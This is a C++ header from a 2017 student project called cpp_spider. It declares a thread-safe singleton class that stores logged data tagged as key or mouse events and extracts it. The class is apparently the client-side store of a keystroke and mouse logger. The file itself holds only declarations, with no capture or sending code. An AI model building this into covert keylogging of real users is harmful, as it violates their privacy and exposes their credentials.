/*
** Data.hpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/Data.hpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:11:37 2017 Gauthier Cler
** Last update Sun Oct 08 22:11:39 2017 Gauthier Cler
*/

#ifndef CPP_SPIDER_DATA_H
#define CPP_SPIDER_DATA_H

#include                <boost/property_tree/ptree.hpp>
#include                <boost/property_tree/json_parser.hpp>
#include                <boost/algorithm/string.hpp>
#include 	            <boost/foreach.hpp>
#include                <string>
#include                <mutex>
#include                <unordered_map>

namespace 		Client {

  class 		Data {

  public:

    enum class 		DataType {
      KEY = 0,
      MOUSE
    };

    static Data &get();
    void logData(const std::string &data, DataType type);
    void lockLogAccessor();
    void unlockLogAccessor();
    std::string extractLog();

  private:

    Data() {};
    Data(const Data &) = delete;
    Data &operator=(const Data &) = delete;

    std::vector<boost::property_tree::ptree>	_logs;
    std::mutex					_logAccessor;

  };
}


#endif //CPP_SPIDER_DATA_H
